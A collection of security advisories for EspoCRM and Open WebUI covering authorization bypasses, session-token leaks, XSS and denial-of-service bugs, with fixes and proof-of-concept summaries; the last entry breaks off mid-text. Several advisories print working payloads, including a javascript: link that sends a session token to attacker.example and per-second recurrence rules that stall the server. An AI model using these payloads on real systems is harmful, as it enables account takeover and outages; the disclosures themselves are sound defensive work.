item.title: [MEDIUM] espocrm/espocrm — IDOR allowing users with access to Import scope to extract data from attachments with known ID
item.description:
CVSS 4.3 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N) · CWE-639, CWE-862
Affected: - espocrm/espocrm <= 10.0.6 (patched: 10.0.7)
---
## Summary
I identified an authenticated authorization bypass in EspoCRM’s import workflow.
`POST /api/v1/Import` accepts a caller-controlled `attachmentId`, but the backend does not verify that the current user is authorized to read that attachment before opening it from storage.
An attacker can create their own Import record using another user’s attachment ID. After the Import record is created, the attacker can call the error export endpoint on their own Import record. EspoCRM then re-opens the original source attachment and copies source rows from that file into a new downloadable CSV attachment owned by the attacker.
This allows a low-privileged authenticated user to disclose contents of another user’s attachment when the attachment ID is known.
## Credit
@kaizhi888

item.title: [MEDIUM] espocrm/espocrm — Address-book search does not check field-level access to emailAddress field
item.description:
CVSS 4.3 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N) · CWE-200, CWE-863
Affected: - other/espocrm/espocrm <= 10.0.6 (patched: 10.0.7)

## Summary
The address-book search API does not check field level ACL against the `emailAddress` field and returns the `emailAddress` value even if the `emailAddress` field is restricted in Roles.
## Note
The user needs to have access to the record. While restricting access to the email address field is rather a rare use case.
## Credit
Wenhao Wu, Southeast University

item.title: [MEDIUM] espocrm/espocrm — Note read does not run ACL output filter leaking values of forbidden audited fields
item.description:
CVSS 4.3 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N) · CWE-200, CWE-863
Affected: - other/espocrm/espocrm <= 10.0.6 (patched: 10.0.7)
---
## Summary
EspoCRM Role *Field Level Security* hides selected fields on record GET/list and, separately, strips those fields from Stream update notes via `NoteAccessControl`. `GET /Note/{id}` does not run that stripper. A user who is allowed to *stream* a parent record but forbidden to *read* a field can recover `data.attributes.was` / `became` for that field by opening the note id shown in the (already-stripped) stream.
## Credit
Wenhao Wu, Southeast University

item.title: [HIGH] open-webui/open-webui — Terminal users can manage Terminals policies and other users' terminals via the terminal proxy
item.description:
CVSS 7.6 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:L) · CWE-862
Affected: - pip/open-webui >= 0.8.6, < 0.11.4 (patched: 0.11.4)
---
# Terminal users can manage Terminals policies and other users' terminals via the terminal proxy
## Summary A regular user who has been given access to a Terminals connection could send requests through Open WebUI's terminal proxy to the Terminals administrator API. Open WebUI forwarded any requested path and attached the administrator-configured shared key, so Terminals treated the request as an administrator request. The user could read and change terminal policies and list and stop other users' terminals, without ever seeing the key.
## Preconditions - An administrator has added a Terminals (orchestrator) connection that uses bearer authentication (the default authentication type for terminal connections) with the Terminals API key. - The attacker has a normal verified account and has been granted access to that connection. - The connection is not pinned to a named policy. Connections pinned to a policy route requests into that policy's own terminal and do not reach the administrator API. - The connected Terminals server is older than 0.2.4. Terminals 0.2.4 refuses administrator requests that carry a user identity, which blocks this path independently. - Deployments without a Terminals connection are not affected.
## Impact Under the preconditions above the attack needs one authenticated request per action and no interaction from anyone else. The attacker could list all active terminals with their owners' user ids, policy, instance name, host, port and activity; stop another user's running terminal; read the Terminals status and configuration; and create and change terminal policies. Changing a policy was observed to take effect on other users: environment variables set by the attacker appeared in a second user's terminal when it next started on a connection pinned to that policy. Stopped terminals are started again on the next access. Open WebUI's own data is not exposed through this path.
## Fix Fixed in 51bb8cb142f72503e861eeee25ae4dc73c26c36b, released in 0.11.4. The terminal proxy now refuses to forward requests to the Terminals administrator paths (policies, status and terminal lifecycle). Terminals 0.2.4 additionally rejects administrator requests that arrive on behalf of a user.
## Root cause - Component: `backend/open_webui/routers/terminals.py`, the `/api/v1/terminals/{server_id}/{path}` proxy. - Affected setup: every build from 0.8.6 through 0.11.3 with a Terminals connection configured.
The proxy was built to let users reach their own terminal through the orchestrator, and it forwarded whatever path the user asked for with the server's shared key attached. Terminals protects its administrator API with that same key, so the proxy never separated user traffic from administrator traffic and a user could choose an administrator path.
## Proof of concept Tested against Terminals 0.2.3 with the Docker backend and a bearer connection using the shared key, with two ordinary users. A direct request to Terminals without the key returns 401. Through Open WebUI 0.11.3, using only the attacker's own session:
``` GET /api/v1/terminals/<server_id>/api/v1/policies -> 200 PUT /api/v1/terminals/<server_id>/api/v1/policies/poc-low-user -> 200, policy created GET /api/v1/terminals/<server_id>/api/v1/terminals -> 200, lists the victim's terminal POST /api/v1/terminals/<server_id>/api/v1/terminals/stop {"user_id":"<victim>","policy_id":"default","context_id":"default"} -> 200 {"matched":1,"stopped":1,"skipped_active":0} ```
The victim's terminal container was removed. Rewriting a policy with an `env` value and then having a second user open a connection pinned to that policy started a container carrying the attacker's value. On 0.11.4 every request above returns 403. The proxy was exercised directly with the connection configuration and user identity supplied by the test harness.
## Credits - @dhlife09 - @ye11oc4t - @jiwhan8655 - @Dog-Parka

item.title: [MEDIUM] open-webui/open-webui — Other users' session tokens disclosed via OAuth-mode connections, tool servers and terminals
item.description:
CVSS 4.2 (CVSS:3.1/AV:N/AC:H/PR:H/UI:R/S:U/C:H/I:N/A:N) · CWE-200
Affected: - pip/open-webui >= 0.6.27, < 0.11.4 (patched: 0.11.4)
---
# Other users' session tokens disclosed via OAuth-mode connections, tool servers and terminals
## Summary An OpenAI-compatible connection, OpenAPI tool server or terminal server configured with the "OAuth" authentication mode sent the full browser cookie jar of the requesting user to its destination, including Open WebUI's own session cookie. The mode is documented to the administrator as forwarding only the user's OAuth access token. Every user whose request reached such a connection disclosed a live session credential to the destination, whether or not they were the administrator who configured it and whether or not an OAuth token was present.
## Preconditions An administrator has configured at least one OpenAI-compatible connection, OpenAPI tool server or terminal server with the "OAuth" authentication mode. Connections default to bearer authentication, so this mode is never active out of the box. No OAuth provider needs to be configured or return a token; the cookies were sent regardless. The destination only needs to observe the incoming Cookie header, which ordinary request logging does. Not affected: connections using the "Session" authentication mode, whose forwarding of session credentials is documented, and MCP tool servers, which never received cookies.
## Impact The operator of the destination receives the Open WebUI session cookie of every verified user whose request reaches it, including through routine calls such as the model list fetched on page load, with no action from the user beyond ordinary use. Replaying that cookie against the instance authenticates as that user for the lifetime of the token, which gives the destination full access to the account and administrative access where the user is an administrator. The destination is a server an administrator registered for OAuth authentication, a configuration that implied sending it only the OAuth access token.
## Fix Fixed in 0.11.4 by https://github.com/open-webui/open-webui/commit/f9f815c86220f809fad5ee1300c44f55dea74c79 (OpenAI-compatible connections), https://github.com/open-webui/open-webui/commit/b71744b17823f7a3a9a64cb363e79a7164ed5b23 (terminal servers) and https://github.com/open-webui/open-webui/commit/3cda47cdb449aac970426f0929c9e5f8bb8bd807 (tool servers and terminal tools). Forwarding the cookie jar is now a separate per-connection setting that is off by default, so the OAuth mode sends only the OAuth access token in the Authorization header. Upgrading resolves the issue with no configuration change.
## Root cause Affected component: the outbound header and cookie builder for OpenAI-compatible connections, the builder for OpenAPI tool servers and terminal tools, and the terminal server proxy. Affected setup: any deployment with a connection, tool server or terminal server set to the "OAuth" authentication mode.
When the OAuth mode was added, its branch copied the cookie line from the neighbouring "Session" branch unchanged, so the whole inbound cookie jar was attached to the outbound request before, and independently of, the OAuth token lookup. The forwarded cookies were never narrowed to what the mode is documented to send. Because each outbound call carries the requesting user's own cookies, the disclosed session belongs to whichever user triggered the call.
## Proof of concept Reproduced by the reporter against a running 0.11.2 instance. An OpenAI-compatible connection was registered with a request-capturing destination and the "OAuth" authentication mode. A model list request authenticated only by the session cookie triggered the outbound call. The destination received the full cookie jar, including the session cookie, and no OAuth token. Replaying the captured cookie against the instance returned an authenticated response as the affected account.
Confirmed during triage by running the connection header builder from 0.11.3 and 0.11.4 with the same session cookies and no OAuth token: 0.11.3 attaches the session cookie to the outbound request, and 0.11.4 attaches no cookies.
## Credits @gigioneggiando @brodmart

item.title: [MEDIUM] open-webui/open-webui — Instance-wide stall via automation recurrence rules that evade sub-daily frequency detection
item.description:
CVSS 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H) · CWE-400, CWE-436
Affected: - pip/open-webui >= 0.11.0, < 0.11.4 (patched: 0.11.4)
---
# Instance-wide stall via automation recurrence rules that evade sub-daily frequency detection
## Summary Any account permitted to create automations can submit a recurrence rule that Open WebUI classifies as harmless while the underlying calendar library reads it as a per-second schedule. Validating such a rule walks every occurrence between the rule's start date and now, synchronously on the shared event loop, so a single request leaves the deployment unable to answer anyone for minutes. Once stored, the scheduler repeats that work on every poll. The 0.11.0 release added a guard against exactly this cost, but the guard decides what a rule is by re-reading the submitted text, and several spellings the calendar library accepts never reach it.
## Preconditions An account permitted to create or update automations. `USER_PERMISSIONS_FEATURES_AUTOMATIONS` defaults to `False`, so out of the box only an administrator qualifies; it becomes reachable by ordinary users on any deployment that has granted the automations feature, which is the normal way to make the shipped feature usable. `UVICORN_WORKERS` defaults to `1`, so there is no second worker to absorb the stall. Nothing else is required: no knowledge of other users, ids or tokens, and no unusual syntax. Deployments that have not granted the automations permission to non-administrators are reachable only by administrators.
## Impact Availability, against every other user of the instance and against the operator. Measured on a real instance running 0.11.0, one create request cost 191.59 seconds of blocked event loop, during which 37 of 48 health checks issued by a second client timed out. The request is cheap to issue and can be repeated or pipelined, and because the rule is accepted and stored, the scheduler re-enters the same parsing on each poll, so the instance does not recover on its own. There is no confidentiality or integrity impact, and no data is disclosed or modified.
## Fix Fixed in https://github.com/open-webui/open-webui/pull/29262 and the accompanying recurrence refactor, both released in 0.11.4. The parser takes the frequency, interval and rule count from the rule the calendar library actually built and splits the rule text on any whitespace the same way the library does, so every accepted spelling is classified and bounded alike. Every schedule evaluation also now runs outside the event loop under a two second budget, so no rule can stall the instance. Upgrading fully resolves the issue; no configuration change is required.
## Root cause Affected component: the recurrence-rule parser and validator in `backend/open_webui/utils/automations.py`. Reached from the automation create, update and toggle handlers in `backend/open_webui/routers/automations.py`, from the built-in automation tools, and from the scheduler's claim path in `backend/open_webui/models/automations.py`. Affected setup: 0.11.0 is affected by every spelling below; 0.11.1 to 0.11.3 are affected by the whitespace-folded spellings only.
The 0.11.0 fix bounds the work by recognising sub-second, per-minute and hourly rules and re-anchoring them near the present. It recognises them by parsing the submitted rule text a second time, by hand, and comparing the result against a fixed set of names. That second parse is stricter than the calendar library's: it matches the frequency name case-sensitively where the library is case-insensitive, it looks for rules on their own lines where the library splits on any whitespace, and it requires a rule keyword prefix the library treats as optional. A rule that any of those disagreements hides is accepted as ordinary and then walked from its stated start date, which is the unbounded behaviour the guard exists to prevent. The guard was present, but it inspected a different reading of the input than the one that was executed.
## Proof of concept Against a real instance running 0.11.0, as an account permitted to create automations. Nothing was seeded directly; each rule was submitted through the normal create endpoint.
Lower-case frequency value:
``` DTSTART:20000101T000000 RRULE:FREQ=secondly;INTERVAL=1 ```
Ordinary upper-case frequency with no rule keyword prefix, which the guard misses just as completely:
``` DTSTART:20000101T000000 FREQ=SECONDLY;INTERVAL=1 ```
Folding the same two lines onto one line separated by a space, or by a tab, has the same effect, as does joining two rule lines by whitespace, which additionally slips past the check that only one recurrence rule was submitted.
Submitting the first rule returned HTTP 200 after 191.59 seconds. A second client polling an unauthenticated health endpoint throughout recorded 37 timeouts across 48 attempts. Submitting the second rule returned HTTP 200 after 154.72 seconds. For comparison, the same rules spelled in the form the guard recognises are validated in under a millisecond.
## Credits @baeseungwon1010 reported the case-varied frequency value, and demonstrated that a rule differing from a benign one only in letter case reaches the unbounded path.
@Classic298 identified the remaining spellings that reach the same path with an ordinary upper-case frequency: a rule submitted without the recurrence keyword prefix, the same rule folded onto a single line by whitespace, and two recurrence rules joined by whitespace, which also defeats the single-rule check.

item.title: [MEDIUM] open-webui/open-webui — Viewer session token theft via javascript: URLs in chat message links
item.description:
CVSS 6.4 (CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:H/I:H/A:N) · CWE-79
Affected: - pip/open-webui < 0.11.4 (patched: 0.11.4)
---
# Viewer session token theft via javascript: URLs in chat message links
## Summary Any authenticated user could place a markdown link with a `javascript:` URL in content that another user later views, such as a shared chat. The link was rendered as a clickable anchor with the URL unchanged, because the markdown renderer never checked the link's scheme. When the victim clicked it in an affected browser, the script ran inside Open WebUI in the victim's session and could read their session token.
## Preconditions - The attacker has any regular account with the chat sharing permission (`chat.share`, on by default). - The victim can open the attacker's shared chat: they were granted access to the share, or they are an admin (admins can open any shared chat by default, `ENABLE_ADMIN_CHAT_ACCESS=true`). Channel messages render through the same component when channels are enabled (`ENABLE_CHANNELS`, off by default). - The victim clicks the link. A plain click triggers it in Safari and every other WebKit browser (which includes every browser on iOS). In Firefox it takes a middle click or a Ctrl/Shift click. Chromium-based browsers do not run it. - No Content-Security-Policy header is set, which is the default.
## Impact The attacker's script runs in the Open WebUI origin as the victim. It reads the victim's JWT from local storage and sends it to the attacker, who can then use the API with the victim's full permissions. If the victim is an admin, that means the whole instance. The attacker needs the victim to open the shared chat and click the link in an affected browser (see Preconditions). Victims on Chromium-based browsers are not affected, and neither is any deployment that sets a CSP forbidding inline script.
## Fix Fixed in [#29890](https://github.com/open-webui/open-webui/pull/29890). Before a markdown link is rendered, its URL is now checked, and only http, https, mailto, tel and relative URLs are kept. A link with any other scheme is shown as plain text. Upgrading is enough.
## Root cause - Component: the chat markdown link renderer (`src/lib/components/chat/Messages/Markdown/MarkdownInlineTokens.svelte`), and in older releases the `marked.parse` rendering in the response message view. - Affected setup: every release before 0.11.4.
Link URLs from the markdown lexer went straight into the anchor's `href`. `marked` does not filter URL schemes, and link tokens skipped DOMPurify (only raw HTML tokens were sanitised), so nothing along the way rejected `javascript:` URLs.
## Proof of concept Reproduced against the official v0.11.3 image with the default configuration, and checked against v0.11.4. 1. As the admin, create two regular users, attacker and victim. 2. As the attacker, create a chat (`POST /api/v1/chats/new`) whose assistant message contains: `[Free GPU credits](jAvascript:fetch('https://attacker.example/leak?t='+localStorage.token))` 3. Share it (`POST /api/v1/chats/{id}/share`) and give the victim read access (`POST /api/v1/chats/shared/{id}/access/update`). 4. As the victim, open `/s/{share_id}` in WebKit and click "Free GPU credits". The listener receives the victim's JWT, sent from the Open WebUI origin. The same happens in Firefox with a middle click or Ctrl+click. 5. On v0.11.4 the link renders without an `href`, and clicking it does nothing.
## Credits - @r20z19, reporter

item.title: [MEDIUM] open-webui/open-webui — Any authenticated user can exhaust server memory via a compressed remote image in a chat message
item.description:
CVSS 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H) · CWE-400, CWE-409
Affected: - pip/open-webui >= 0.6.42, < 0.11.4 (patched: 0.11.4)
---
# Any authenticated user can exhaust server memory via a compressed remote image in a chat message
## Summary An ordinary account can put any URL in the image field of a chat message. The server fetches that URL and inlines the bytes into the request it sends on to the model provider. The fetch had no ceiling on how much it would read, and HTTP content encoding lets the sender decide how much the receiver materialises, so a few hundred kilobytes crossing the network turn into hundreds of megabytes held in the server process. Nothing on that path limited the size, the compression ratio, or how often it could be repeated.
## Preconditions - Default configuration. Nothing needs to be enabled and no setting needs to be weakened. - Any verified account with access to a model. No elevated role and no workspace permission. - A host the attacker controls, reachable from the server, returning a compressed response. The URL has to resolve to a public address: the private-address filter is untouched and still blocks internal targets. - Every build from 0.6.42 through 0.11.3 carries the affected code.
## Impact Availability, against every other user of the instance. Measured against a real instance: a single request from an ordinary account, with about 261 KB leaving the attacker's host, drove the server process from 731 MB to 2.16 GB resident and returned HTTP 200. That figure is a setting rather than a ceiling, because the size is chosen by the attacker's host and the request can be repeated. There is no confidentiality or integrity effect, and no data is read or altered.
## Fix Fixed in 0.11.4 by #29623. The image fetch now reads the response incrementally, asks for an unencoded body, and refuses any response that still arrives compressed, so the sender can no longer pick the decoded size. An image that arrives compressed is not inlined and the message is sent on without it. Upgrading is sufficient, there is nothing an operator has to configure.
## Root cause - `backend/open_webui/utils/files.py`, `get_image_base64_from_url`: read the whole response body into memory before encoding it. - `backend/open_webui/utils/middleware.py`, `convert_url_images_to_base64`: the caller, which runs on every chat request and holds each encoded image for the life of that request.
The helper was written to fetch a small image and treats a response as something that arrives whole. The announced length was never the constraint that mattered, because content encoding decides how much the receiver has to materialise. The HTTP client library decompresses transparently, so a small compressed body expands to an attacker-chosen decoded size in the server process before any size check applies. The same unbounded read is present in both implementations of the helper, the one using the synchronous HTTP client before 0.9.0 and the asynchronous one after it.
## Proof of concept Against a real instance, as an account with the default user role:
1. Host a server that returns a gzip-encoded response and writes the compressed bytes in small pieces rather than all at once. 2. As the ordinary account, send a chat message containing an image item whose URL points at that server. 3. The request returns 200.
Measured on that run: 260,934 bytes left the attacker's host, the server decoded 268,435,456 bytes, and the process grew from 730,980,352 to 2,163,429,376 bytes resident over 2.6 seconds.
## Credits @y4rvin, for the finding.

item.title: [HIGH] open-webui/open-webui — Any website can steal a signed-in user's session token via the community stats message handler
item.description:
CVSS 8.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N) · CWE-346
Affected: - pip/open-webui >= 0.7.0, < 0.11.4 (patched: 0.11.4)
---
# Any website can steal a signed-in user's session token via the community stats message handler
## Summary The sync stats modal registered a `window` message listener that processed `verify:chat` messages from any web origin without checking `event.origin`, and replied to `window.opener` with target origin `*`. The chat id from the message was inserted into an authenticated request URL without encoding. Any external website that a signed-in user visits can therefore make that user's browser fetch a chosen authenticated endpoint and hand the response, including the user's session token, back to the attacker. No attacker account and no administrator action are required.
## Preconditions - Community sharing enabled (`ENABLE_COMMUNITY_SHARING`, default `True`), which is what mounts the sync stats modal and its message listener. - The victim is signed in to Open WebUI in the same browser and visits an attacker-controlled page that opens Open WebUI in a popup. Deployments with community sharing disabled are not affected.
## Impact The attacker page posts a `verify:chat` message carrying a path-traversal chat id such as `../../../auths/`. The listener passes it unencoded into `GET /api/v1/chats/stats/export/<id>`, which the browser normalises to `GET /api/v1/auths/` and sends with the victim's bearer token. The listener then posts the response back to the opener with target origin `*`, so the attacker origin receives the victim's identity and raw JWT. That token replays from any client with only an `Authorization` header, granting full API access as the victim: private chats and any authenticated action under the victim's role. The demonstrated victim held the ordinary `user` role.
## Fix Fixed in v0.11.4 by PR #29918. The listener now ignores any message whose `event.origin` is not one of the known community origins, replies only to that validated origin instead of `*`, and the chat id is passed through `encodeURIComponent` so it can no longer escape its URL path segment. Upgrading to 0.11.4 fully resolves the issue with no further configuration.
## Root cause `src/lib/components/chat/Settings/SyncStatsModal.svelte` held a `verify:chat` message handler, and `exportSingleChatStats` in `src/lib/apis/chats/index.ts` built the request URL. The handler is mounted on every page whenever community sharing is enabled, so the listener was active even while the modal was hidden. The origin allowlist that already guarded the other community message handlers was absent here, and the chat id was concatenated into the path without encoding, so an attacker-chosen value could both be accepted from an untrusted origin and redirect the authenticated request to a different endpoint.
## Proof of concept Reproduced against the vulnerable and fixed code in a two-origin browser harness. From an attacker origin, opening the target and repeatedly posting `{ type: 'verify:chat', data: { id: '../../../auths/' } }` caused the target to issue `GET /api/v1/auths/` carrying the victim's bearer token and to post the response back to the attacker origin, which then received the victim's email and JWT. Against the fixed code the message is rejected on the origin check and no request is made.
## Credits @zyakir13

item.title: [HIGH] open-webui/open-webui — Viewer session token theft via a script link in a shared chat's citation
item.description:
CVSS 7.3 (CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:N) · CWE-79
Affected: - pip/open-webui >= 0.6.33, < 0.11.4 (patched: 0.11.4)
---
# Viewer session token theft via a script link in a shared chat's citation
## Summary Any authenticated user can store a `javascript:` URL in the `embed_url` field of a chat citation and share that chat with another user. When the second user opens the shared chat and clicks the citation, the URL is passed straight to `window.open`, executing attacker script in the Open WebUI origin. The frontend never checks the URL scheme before opening it, so the attacker's script runs with the victim's session and can read `localStorage.token` and act as the victim.
## Preconditions Default configuration, fresh database, no special settings. The attacker is any authenticated user who can create and share a chat (no admin rights, no `workspace.*` permission). The victim is any user who opens the shared read-only chat (`/s/{share_id}`), expands the sources, and clicks the malicious citation. The `embed_url` value is set by editing the attacker's own chat through the normal chat update API, which stores the attacker-controlled citation structure.
## Impact Script executes in the application origin as the victim, so the attacker can exfiltrate `localStorage.token` (the JWT used for every API call) and then act with the victim's permissions, including reading the victim's private chats. Exploitation requires the victim to click the citation in the shared chat. If the victim is an administrator, the account compromise extends to admin capabilities. Only the citation-embed click path is affected; citations whose `embed_url` is a normal http/https link are unaffected.
## Fix Fixed in 0.11.4 by PR #29701. The citation click handler now requires the `embed_url` to be an `http`/`https` URL (or protocol-relative) before it is opened or handed to the embed panel; any other value, including a `javascript:` URL, falls back to the citation modal, which renders the source safely. Upgrading to 0.11.4 fully resolves the issue with no further configuration.
## Root cause `src/lib/components/chat/Messages/Citations.svelte` (`showSourceModal`) read `citations[index].source.embed_url` and, when the chat is read-only, called `window.open(embedUrl, '_blank')` directly. The value comes from the stored chat, which a user fully controls through the chat update API, and no URL-scheme validation stood between the stored value and the sink. The read-only `window.open` branch shipped from 0.6.33 onward, so every build from 0.6.33 through 0.11.3 carried the code.
## Proof of concept The reporter reproduced with two normal accounts on a default 0.11.3 instance: the attacker stored a citation with `embed_url` set to a `javascript:` payload that fetched `localStorage.token` to a listener, shared the chat with the victim, and on the victim clicking the citation the token was exfiltrated and then used to read a private victim chat that the attacker account could not access directly. Independently confirmed in Chromium that `window.open` with a `javascript:` URL and a `_blank` target runs in the opening page's origin and can read and send its `localStorage.token`. On 0.11.4 the guard rejects `javascript:` and `data:` values and admits only http, https and protocol-relative URLs to that path.
## Credits Reported by @zyakir13. Fix by @Classic298.

item.title: [MEDIUM] open-webui/open-webui — Directory structure of inaccessible knowledge bases disclosed via an unscoped directory id
item.description:
CVSS 4.3 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N) · CWE-639, CWE-863
Affected: - pip/open-webui >= 0.9.6, < 0.11.4 (patched: 0.11.4)
---
# Directory structure of inaccessible knowledge bases disclosed via an unscoped directory id
## Summary A user who can read one knowledge base could list it with the id of a directory that belongs to a different knowledge base they have no access to. The response returned that directory and every parent above it, including folder names and the owning user. The same foreign directory id was also accepted as the parent of a new or moved directory and as the target directory when linking files. None of these paths checked that the directory belonged to the knowledge base named in the request.
## Preconditions - An account with read access to at least one knowledge base, through a share grant, the `workspace.knowledge` permission (off by default) or the admin role. - The id of a directory inside a knowledge base the attacker cannot access. Directory ids are random UUIDs and cannot be enumerated, so in practice this is someone who saw them earlier, for example a collaborator whose access was later revoked. - No configuration flag is involved. Every deployment running an affected version with knowledge base directories carries the code path.
## Impact With one retained directory id, the attacker reads the current name, id, parent, owner user id, containing knowledge base id and timestamps of that directory and all of its ancestors. Renames made after their access was revoked are also visible. Where folder names encode client, project or case names, that structure is the sensitive part. The id requirement keeps the realistic attacker population small. The write-side paths let the attacker attach their own directories or files under a foreign directory, but this gives them nothing beyond the write access they already hold on their own knowledge base. File contents, file lists and the embeddings of the foreign knowledge base are not exposed.
## Fix Fixed in a9541c18c. Directory lookups are now bound to the knowledge base in the request: the breadcrumb walk only follows directories of that knowledge base, and every endpoint that accepts a directory or parent id rejects one from another knowledge base. The upload path ignores it. Upgrading is sufficient.
## Root cause - `backend/open_webui/models/knowledge.py`, `get_directory_breadcrumbs` - `backend/open_webui/routers/knowledge.py`, `GET /api/v1/knowledge/{id}/files` (`directory_id`), `POST /{id}/dirs/create` and `POST /{id}/dirs/{dir_id}/update` (`parent_id`), `POST /{id}/file/add` and `POST /{id}/files/batch/add` (`directory_id`) - `backend/open_webui/routers/files.py`, upload auto-link (`metadata.directory_id`) - Present in every release from 0.9.6, when knowledge base directories were introduced.
Each endpoint checked the caller's access to the knowledge base in the URL and then used the caller-supplied directory id as given. The breadcrumb walk looked directories up by id alone, while the file list and directory list in the same response were filtered by knowledge base. So the one part of the response that followed the caller's id could leave the authorised knowledge base. The create, update and link paths had the same gap, and only the move, delete and sync cleanup paths compared the directory's knowledge base to the one in the URL.
## Proof of concept Reproduced against the real knowledge router on a fresh database. The admin owns a private knowledge base A with the nested directories `ACME-Litigation/witness-list` and a knowledge base B shared with an ordinary user.
1. As the user, `GET /api/v1/knowledge/{A}/files` returns 400 (no access). 2. As the user, `GET /api/v1/knowledge/{B}/files?directory_id={id of witness-list}` returns 200 with `breadcrumbs` listing `ACME-Litigation` and `witness-list`, each carrying knowledge base A's id and the admin's user id. 3. As the user, `POST /api/v1/knowledge/{B}/dirs/create` with `parent_id` set to a directory of A returns 200 and stores the foreign parent. The same happens for `POST /api/v1/knowledge/{B}/dirs/{dir}/update`.
On the fixed version, step 2 returns an empty `breadcrumbs` list and step 3 returns 404. Directories of B still produce breadcrumbs and can still be used as parents.
## Credits - 0xMax-Sec (reporter)

item.title: [MEDIUM] open-webui/open-webui — Any authenticated user can reach disabled model provider backends via an explicit backend index
item.description:
CVSS 4.3 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N) · CWE-639, CWE-862
Affected: - pip/open-webui < 0.11.4 (patched: 0.11.4)
---
# Any authenticated user can reach disabled model provider backends via an explicit backend index
## Summary
Several Ollama and OpenAI-compatible model listing routes accept a caller-supplied backend index and use it to select a connection directly from the administrator-configured provider list. No check is performed on whether the caller is permitted to reach that connection. Any account with the `user` role can therefore make the server issue requests to a provider backend it was never granted, including one the administrator has explicitly disabled, and can read back that backend's version string. Two of the affected routes send the request with the connection's configured API key attached.
## Preconditions
- More than one model provider connection configured, either Ollama backends or OpenAI-compatible connections. A deployment with a single connection loses nothing here, because the caller can only select a connection that is already the one in use. - An account with the `user` role. `DEFAULT_USER_ROLE` defaults to `pending`, so an administrator must have approved the account or the deployment must be configured to grant `user` on signup. Administrator privileges are not required, and the affected behaviour is intended for administrators. - No other knowledge is required. The index is a small integer and valid values can be found by trial. - `BYPASS_MODEL_ACCESS_CONTROL` defaults to `false`. With the default, the catalogue returned by the affected routes is filtered by per-model access control, so no model names are disclosed. With the flag set to `true`, the catalogues of enabled connections are already visible to every account through the routes that take no index, but a disabled connection's catalogue is only reachable through the index, and so is sending inference to it.
## Impact
A non-administrator can direct the server to contact a provider backend outside the set it is entitled to use. This covers backends the administrator has switched off, which the equivalent routes that take no index correctly skip, and backends that serve only models the account has no access to. On two of the affected routes the outbound request carries that connection's configured API key, so the backend accepts it as an authorised call. The key itself is never returned to the caller.
The version string of any configured backend, including a disabled one, is returned to the caller verbatim. The routes that return a model catalogue disclose nothing under default configuration, because the upstream response is filtered by per-model access control before it is returned. An out-of-range index previously produced a different response from a valid one, which revealed how many connections are configured.
With `BYPASS_MODEL_ACCESS_CONTROL` enabled, the same missing check applied to the inference routes, so a non-administrator could send generation and embedding requests to a disabled backend and consume its capacity, rather than only listing it.
Nothing is written or deleted on any backend, no credential is disclosed to the caller, and no other account's data is exposed. The reachable destinations are limited to the connections the administrator configured, so no request can be steered to an address of the caller's choosing.
## Fix
Fixed in [#29619](https://github.com/open-webui/open-webui/pull/29619), completing an earlier change that shipped in 0.11.1. Selecting a provider connection by explicit index now requires an administrator on the affected listing routes, whether the index is given as a path segment or as a query parameter, matching the model management routes alongside them. The per-model backend check on the inference routes is no longer skipped when per-model access control is bypassed. The 0.11.1 change gated only the path form, so 0.11.1 to 0.11.3 remained reachable through the query parameter. Upgrading to 0.11.4 fully resolves the issue with no configuration change.
## Root cause
The affected surface is the Ollama tag listing, version and OpenAI-format model listing routes, and the OpenAI-compatible model listing route. Each is available to any verified account and accepts the backend index both as a trailing path segment and as a query parameter on the form that takes no index. Every released version before 0.11.4 carries the code.
An earlier fix introduced a check that a caller-supplied index must point at a backend actually serving the requested model, and applied it to the routes that run inference. The listing routes were not covered, because they name no model and therefore had nothing for that check to compare against. The question they needed answering was different, namely whether the caller may address a specific connection at all, and no control existed for it. The same earlier check also stepped aside entirely when per-model access control was bypassed. That left the inference routes open in that configuration for the one case per-model access control does not describe: an administrator having disabled the backend.
## Proof of concept
Two provider connections were configured through the administrator API, with index 1 marked disabled and holding a distinct API key. The backends were local HTTP servers standing in for real providers, recording every request they received along with its `Authorization` header. A second account was created with the `user` role.
As that account, requesting the tag listing, version and model listing routes with index 1, in both the path and query forms, returned HTTP 200. The disabled backend recorded each request, and the tag listing and OpenAI-compatible model listing arrived carrying the administrator's configured key for that connection. The version route returned the disabled backend's version string to the caller verbatim. An index beyond the end of the list produced a server error where a valid index produced a success, giving the number of configured connections.
With `BYPASS_MODEL_ACCESS_CONTROL` set to `true`, the same account sent a chat completion to index 1 and the disabled backend served it.
After the fix, every indexed listing request returns HTTP 401 and the indexed chat completion returns HTTP 403, and the disabled backend records nothing. Administrator access and the routes that take no index are unchanged.
## Credits
Reported by @ahkarl13.

item.title: [MEDIUM] open-webui/open-webui — Any authenticated user can exhaust worker memory via a nested-repetition knowledge-search pattern
item.description:
CVSS 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H) · CWE-400, CWE-770
Affected: - pip/open-webui >= 0.11.0, < 0.11.4 (patched: 0.11.4)
---
# Any authenticated user can exhaust worker memory via a nested-repetition knowledge-search pattern
## Summary The built-in knowledge search tools let a chat participant choose the pattern used to grep knowledge files. That pattern is compiled before any of the limits on the search apply, and the regular expression engine expands counted repetition as it compiles, so a pattern that nests repetition counts forces it to build a structure vastly larger than the pattern itself. A pattern of a couple of dozen characters makes one worker allocate hundreds of megabytes, and because compiled patterns are cached for the life of the process, that memory is never returned. Neither the size of that work nor the number of times it can be repeated is bounded.
